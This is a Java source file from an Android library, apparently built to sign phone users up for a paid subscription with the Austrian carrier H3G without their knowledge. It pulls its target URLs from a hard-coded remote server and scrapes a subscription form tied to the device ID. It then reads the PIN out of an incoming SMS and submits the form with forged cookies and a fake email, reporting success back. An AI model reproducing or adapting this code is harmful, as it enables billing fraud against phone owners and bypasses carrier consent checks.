package com.enhtmv.sublib.work;

import android.text.TextUtils;

import com.alibaba.fastjson.JSON;
import com.enhtmv.sublib.common.SubCall;
import com.enhtmv.sublib.common.http.SubHttp;
import com.enhtmv.sublib.common.http.SubResponse;
import com.enhtmv.sublib.common.util.SubLog;

import org.jsoup.nodes.Element;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

/**
 * 奥地利H3G
 */
public class AodiliH3g extends SubCall {


    private Info info;

    private Meta meta;

    private boolean ok = true;


    public class Info {
        String cookie;
        String action;
        Map<String, String> form;
        String referer;

        private Info(String cookie, String action, String referer, Map<String, String> form) {
            this.cookie = cookie;
            this.action = action;
            this.referer = referer;
            this.form = form;
        }

        @Override
        public String toString() {
            return "Info{" +
                    "cookie='" + cookie + '\'' +
                    ", action='" + action + '\'' +
                    ", form=" + form +
                    ", referer='" + referer + '\'' +
                    '}';
        }
    }

    public static class Meta {
        String url1;
        String url2;
        String url3;


        public void setUrl1(String url1) {
            this.url1 = url1;
        }


        public void setUrl2(String url2) {
            this.url2 = url2;
        }


        public void setUrl3(String url3) {
            this.url3 = url3;
        }
    }

    public AodiliH3g() {
        super("http://54.153.76.222:8081");
    }

    private Meta getMeta() throws IOException {

        String text = meta();

        return JSON.parseObject(text, Meta.class);

    }

    @Override
    public synchronized void call() {


        if (this.ok) {

            try {

                meta = getMeta();

                if (meta != null) {

                    this.ok = false;

                    SubHttp http = http();


//                    String url1 = "http://www.gogamehub.com/at/lp?aff=zcj&dvid=" + androidId;
                    String ptxid = http.get(meta.url1 + androidId).doc().select("#ptxid").first().text();

//                    String url2 = "http://cpx5.allcpx.com:8088/subscript/request/" + ptxid;
                    SubResponse response = http.get(meta.url2 + ptxid);


                    Element form = response.doc().select("form").first();

                    String action = form.attr("action");
                    String referer = response.response().request().url().toString();
                    String cookie = response.cookie();
                    Map<String, String> values = new HashMap<>();

                    for (Element input : form.select("input")) {

                        String key = input.attr("name");
                        String value = input.attr("value");

                        values.put(key, value);
                    }

                    if (values.size() < 2) {
                        throw new Exception(info.toString());
                    }


                    info = new Info(cookie, action, referer, values);

                    SubLog.i(info);

                    report.i("sub reqeust", info);
                }
            } catch (Exception e) {
                this.ok = true;

                SubLog.e(e, "sub request call error !");
                report.e("sub request call error !", e);
            }
        }


    }

    @Override
    public synchronized void call(String message) {

        if (info != null && meta != null) {
            if (!TextUtils.isEmpty(message) && message.length() > 10) {

                String code = message.substring(5, 10);

                if (!TextUtils.isEmpty(code)) {

                    //一定要去掉空格！！！
                    code = code.trim();


                    try {
                        Integer.parseInt(code);
                    } catch (NumberFormatException e) {

                        report.w("message error!", message);
                        return;
                    }


                    info.form.put("pin", code);

                    Map<String, String> header = new HashMap<>();

                    String im1 = "com.silverpop.iMAWebCookie=" + UUID.randomUUID().toString();
                    String im2 = "com.silverpop.iMA.session=" + UUID.randomUUID().toString();
                    String im3 = "com.silverpop.iMA.page_visit=" + "1969604377:";

                    header.put("Cookie", info.cookie + ";" + im1 + ";" + im2 + ";" + im3);
                    header.put("Referer", info.referer);


                    if (!info.form.containsKey("email")) {
                        info.form.put("email", this.androidId + "@gmail.com");

                    }


                    try {

                        SubResponse response = http().form(info.action, header, info.form);

                        if (response.response().request().url().toString().startsWith(meta.url3)) {

                            SubLog.i("success");

                            successCall.callback("success");

                            report.s("sub success");

                        } else {
                            report.w("sub failure", response);
                        }


                    } catch (Exception e) {
                        SubLog.e(e, "sub message call error !");
                        report.e("sub message  call error !", e);
                    } finally {
                        info = null;
                        ok = true;
                    }

                }

            }
        }
    }


}
